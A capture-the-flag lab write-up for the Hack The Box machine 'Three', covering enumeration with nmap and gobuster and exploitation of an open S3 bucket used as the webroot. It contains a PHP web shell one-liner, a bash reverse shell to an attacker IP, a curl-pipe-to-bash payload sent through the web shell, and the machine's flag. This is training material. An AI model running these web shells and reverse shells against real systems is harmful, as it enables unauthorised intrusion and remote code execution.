---

---

# Three
---
## Getting Started
---
Use command to set Target IP
```bash
IP=10.129.89.120 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 08:35 EDT
Nmap scan report for 10.129.89.120
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds

```

**Findings**
Port 22 is running OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

Port 80 is running Apache httpd 2.4.29 ((Ubuntu))

---
### Website Enumeration
---
#### Interrogate website with Gobuster for PHP
---

Command
```bash
gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

```

Result
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.89.120/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/10/02 08:38:59 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.89.120/images/]
/index.php            (Status: 200) [Size: 11952]                                 
Progress: 80622 / 175330 (45.98%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2022/10/02 08:44:03 Finished
===============================================================

```

**Findings**
Website is using .php
Website had a mention of

---
#### Interrogate website with Gobuster for Sub domains
---

Add domain to /etc/host

Command
```bash
echo "$IP thetoppers.htb" | sudo tee -a /etc/hosts
cat /etc/hosts
```

Result
```bash
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.173.76   unika.htb
10.129.89.120 thetoppers.htb

```

Run Gobuster to find Sub-domain

Command
```bash
gobuster vhost -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb  
```

Result
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/kali/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/02 08:50:47 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 502) [Size: 424]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]
                                                         
===============================================================
2022/10/02 08:51:07 Finished
===============================================================

```

**Findings**
Gobuster identified two Sub-domains

| Sub-domain                 | Statsus     |
| -------------------------- | ----------- |
| s3.thetoppers.htb          | Status: 502 |
| `gc._msdcs.thetoppers.htb` |     Status: 400        | 

Add to /etc/hosts

Command
```bash
echo "$IP s3.thetoppers.htb" | sudo tee -a /etc/hosts
cat /etc/hosts
```

Result
```bash
10.129.89.120 s3.thetoppers.htb
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.173.76   unika.htb
10.129.89.120 thetoppers.htb
10.129.89.120 s3.thetoppers.htb


```

Navigate To `http://s3.thetoppers.htb/`

Returns
>![[Pasted image 20221002090658.png]]

**Findings**

>A quick Google search containing the keywords "s3 subdomain status running" returns this result stating that S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS  S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static  Website etc. The files stored in the Amazon S3 bucket are called S3 objects.

Install [awscli](obsidian://open?vault=OSCP&file=TOOLS%2Faswcli%2FHow%20to) and see cheatsheet.

Use ls


Command
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Result
```bash

```

**Findings**
>We see the files `index.php` , `.htaccess` and a directory called `images` in the specified bucket. It seems like this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as storage.

>`awscli` has got another feature that allows us to copy files to a remote bucket. We already know that the website is using PHP. Thus, we can try uploading a PHP shell file to the `S3` bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we  will achieve remote code execution

We can use the following PHP one-liner which uses the `system()` function which takes the URL parameter `cmd` as an input and executes it as a system command.

Create Payload to get shelll

Command 
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Use awscli to copy payload in to the S3 bucket.

Command
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Result
```bash
upload: ./shell.php to s3://thetoppers.htb/shell.php  
```

This paylod will allow you to us `cmd` to execute commands in the browser.

Add `cmd=<command>` 

Run id Command to get user and groups and enumerate further

Command
```bash
http://thetoppers.htb/shell.php?cmd=id
```

Result
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data
```

Create a shell.sh file that contains
```bash
#!bin/bash
bash -i >& /dev/tcp/10.10.15.149/1337 0>&1 
```

Open a ncat listener on port 1337

Command 
```bash
nc -nvlp 1337
```

Start a web server in in the dir of shell.sh 

```bash
python3 -m http.server 8000
```


Use `curl` utility to fetch the bash reverse shell file from our local host and then pipe it to `bash`  in order to execute.

Visit the following URL containing the payload in the browser.

```bash
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.149:8000/shell.sh|bash
```

Downloaded shell.sh and executed it.

Ncat connected

Look for flag
```bash
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```


---
## Flags
flag.txt
```bash
a980d99281a28d638ac68b9bf9453c2b
```


---
## Tags
---

#aws #awscli #httpserver #gobuster 